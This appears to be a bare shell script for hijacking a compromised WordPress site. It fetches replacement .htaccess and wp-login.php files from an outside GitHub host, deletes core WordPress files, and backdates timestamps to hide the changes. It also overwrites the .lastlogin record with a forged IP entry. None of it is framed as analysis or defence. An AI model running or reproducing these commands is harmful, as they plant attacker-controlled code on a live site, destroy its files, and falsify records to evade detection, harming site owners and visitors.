wget https://raw.githubusercontent.com/DarkSeoTR/darkseotr.github.io/master/phpengelle.txt -O /wp-includes/.htaccess
wget https://raw.githubusercontent.com/DarkSeoTR/darkseotr.github.io/master/phpengelle.txt -O /wp-content/.htaccess
rm -rf wp-login.php 
rm -rf /public_html/wp-blog-header.php
wget https://raw.githubusercontent.com/DarkSeoTR/darkseotr.github.io/master/wp-login.txt -O /public_html/wp-login.php
touch -t "2019-09-26" /public_html/wp-content/
touch -t "2019-09-26" /public_html/wp-includes/
touch -t "2019-09-26" /public_html/*
touch -t "2019-09-26" /public_html/
rm -rf .lastlogin
echo "176.88.68.250 # 2019-09-26 18:57:06 +0300" > .lastlogin
touch -t "2019-09-26" *
